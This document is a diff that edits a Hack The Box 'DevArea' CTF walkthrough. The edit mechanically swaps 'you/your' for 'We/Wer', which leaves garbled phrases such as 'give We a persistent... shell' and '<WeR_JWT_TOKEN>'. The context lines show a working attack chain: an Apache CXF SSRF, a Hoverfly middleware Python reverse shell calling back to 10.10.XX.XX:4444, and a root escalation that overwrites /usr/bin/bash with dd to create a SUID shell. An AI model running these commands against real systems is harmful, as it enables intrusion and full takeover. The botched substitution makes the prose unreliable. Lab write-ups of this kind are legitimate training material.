@@ -46,7 +46,7 @@ The SOAP service on port 8080 uses Apache CXF, which is vulnerable to a Server-S
 ![DevArea](htb_dev_area_jetty_apa.png)
 
 **The Vulnerability:**
-By injecting an `<xop:Include>` tag into a standard SOAP request, you can force the underlying XML parser to fetch an external or local resource. The server reads the file and embeds its contents as a Base64 encoded string inside the XML response. 
+By injecting an `<xop:Include>` tag into a standard SOAP request, We can force the underlying XML parser to fetch an external or local resource. The server reads the file and embeds its contents as a Base64 encoded string inside the XML response. 
 
 Using the `lfi.sh` wrapper script, we exploit this to read local files on the target.
 
@@ -87,7 +87,7 @@ Next, we upload a middleware script. We configure Hoverfly to use `python3` as t
 
 ```bash
 curl -X PUT http://10.129.128.3:8888/api/v2/hoverfly/middleware \
-  -H "Authorization: Bearer <YOUR_JWT_TOKEN>" \
+  -H "Authorization: Bearer <WeR_JWT_TOKEN>" \
   -H "Content-Type: application/json" \
   -d '{"binary":"python3", "script":"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.XX.XX\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")"}'
 ```
@@ -97,7 +97,7 @@ For the middleware to execute, Hoverfly needs to process a request. By default, 
 
 ```bash
 curl -X PUT http://10.129.128.3:8888/api/v2/hoverfly/mode \
-  -H "Authorization: Bearer <YOUR_JWT_TOKEN>" \
+  -H "Authorization: Bearer <WeR_JWT_TOKEN>" \
   -H "Content-Type: application/json" \
   -d '{"mode":"synthesize"}'
 ```
@@ -107,7 +107,7 @@ The middleware is armed, but port 8500 (the proxy) is likely bound to `localhost
 
 This is where we chain the vulnerabilities. We use the **initial Apache CXF SSRF flaw** to make the target server send a request to its own internal proxy. 
 
-Pop open a new tmux pane for your listener:
+Pop open a new tmux pane for Wer listener:
 ```bash
 nc -lnvp 4444
 ```
@@ -121,7 +121,7 @@ Then, trigger the SSRF:
 
 The SOAP service attempts to fetch the URL via the proxy on port 8500. Hoverfly intercepts the request, enters `synthesize` mode, and executes our Python middleware. The script fires, throwing a reverse shell back to `10.10.XX.XX:4444`.
 
-You catch the shell as the `dev_ryan` user. 
+We catch the shell as the `dev_ryan` user. 
 
 ```bash
 dev_ryan@devarea:/opt$ cd /home/dev_ryan
@@ -148,18 +148,18 @@ dev_ryan@devarea:~$ sudo -l
 The output shows that `dev_ryan` can run a specific script as root without a password:
 `(root) NOPASSWD: /opt/syswatch/syswatch.sh`
 
-While you can't edit `syswatch.sh` itself to inject malicious code, you know that the script relies on an interpreter. If it starts with `#!/bin/bash` (which it does), `sudo` will call `/usr/bin/bash` to execute it. If you can control `/usr/bin/bash`, you control what executes as root.
+While We can't edit `syswatch.sh` itself to inject malicious code, We know that the script relies on an interpreter. If it starts with `#!/bin/bash` (which it does), `sudo` will call `/usr/bin/bash` to execute it. If We can control `/usr/bin/bash`, We control what executes as root.
 
 ![DevArea](htb_dev_area_env.png)
 
 ### **Bypassing the Kernel Lock**
 
-The goal is to overwrite `/usr/bin/bash` with a malicious script. However, Linux protects running executables. Because your initial reverse shell was spawned using `pty.spawn("/bin/bash")`, the kernel places a lock on the binary, resulting in the `Text file busy` error when you try to overwrite it.
+The goal is to overwrite `/usr/bin/bash` with a malicious script. However, Linux protects running executables. Because Wer initial reverse shell was spawned using `pty.spawn("/bin/bash")`, the kernel places a lock on the binary, resulting in the `Text file busy` error when We try to overwrite it.
 
-To bypass this, you need a shell session that doesn't rely on `bash`. 
+To bypass this, We need a shell session that doesn't rely on `bash`. 
 
 **The SSH Persistence Strategy:**
-1. Generate an SSH keypair on your local Kali machine.
+1. Generate an SSH keypair on Wer local Kali machine.
 2. Drop the public key into `/home/dev_ryan/.ssh/authorized_keys`.
 3. SSH into the box, explicitly requesting a different shell like `/bin/sh` (which is often symlinked to `dash` on Debian/Ubuntu systems).
 
@@ -173,19 +173,19 @@ Now, `/usr/bin/bash` is completely free of locks and ready to be overwritten.
 
 ### **The Overwrite Exploit**
 
-With the lock removed, you prepare the trap. Instead of a complex binary exploit, you simply replace the `bash` executable with a shell script.
+With the lock removed, We prepare the trap. Instead of a complex binary exploit, We simply replace the `bash` executable with a shell script.
 
 **Create a Backup:**
-Always back up system binaries before tampering with them so you don't permanently break the box.
+Always back up system binaries before tampering with them so We don't permanently break the box.
 ```sh
 cp /usr/bin/bash /tmp/bash.bak
 ```
 
 **Payload:**
-You create a script (`/tmp/payload.sh`) that will act as the fake bash. When executed as root, this script will:
+We create a script (`/tmp/payload.sh`) that will act as the fake bash. When executed as root, this script will:
 * Point its own hashbang to the backed-up bash (`#!/tmp/bash.bak`) so it can actually run.
 * Copy the root flag to `/tmp` and make it readable by everyone.
-* Create a SUID copy of the real bash (`/tmp/rootbash`) to give you a persistent, interactive root shell.
+* Create a SUID copy of the real bash (`/tmp/rootbash`) to give We a persistent, interactive root shell.
 * Attempt to restore the original bash binary.
 * Pass execution back to the real bash so `syswatch.sh` finishes running without looking suspicious.
 
@@ -211,19 +211,19 @@ chmod +x /tmp/payload.sh
 This is where the magic happens. 
 
 **1. Spring the Trap:**
-You use `dd` to forcefully overwrite the system's `bash` with your script. 
+We use `dd` to forcefully overwrite the system's `bash` with Wer script. 
 ```sh
 dd if=/tmp/payload.sh of=/usr/bin/bash
 ```
 
 **2. Trigger the Sudo Command:**
-You run the command you are allowed to execute. 
+We run the command We are allowed to execute. 
 ```sh
 sudo /opt/syswatch/syswatch.sh -version
 ```
-`sudo` sees the command, sees it requires `/usr/bin/bash`, and executes your payload as root. 
+`sudo` sees the command, sees it requires `/usr/bin/bash`, and executes Wer payload as root. 
 
-*(Note: The binary garbage and syntax errors you saw earlier happen here because the payload attempts to overwrite `/usr/bin/bash` while it is currently reading from it, causing the interpreter to choke on raw binary data. However, because bash executes line-by-line, the first half of the script—the part that steals the flag and makes the SUID shell—has already succeeded before the crash).*
+*(Note: The binary garbage and syntax errors We saw earlier happen here because the payload attempts to overwrite `/usr/bin/bash` while it is currently reading from it, causing the interpreter to choke on raw binary data. However, because bash executes line-by-line, the first half of the script—the part that steals the flag and makes the SUID shell—has already succeeded before the crash).*
 
 **3. Claim the Flag:**
 ```sh
@@ -233,7 +233,7 @@ cat /tmp/root.txt
 ![DevArea](htb_dev_area_ssh_root_flag.png)
 
 **4. Restore the System:**
-To be a good citizen on the CTF platform and fix the syntax errors for anyone else relying on `bash`, you restore the backup:
+To be a good citizen on the CTF platform and fix the syntax errors for anyone else relying on `bash`, We restore the backup:
 ```sh
 cat /tmp/bash.bak > /usr/bin/bash
 ```
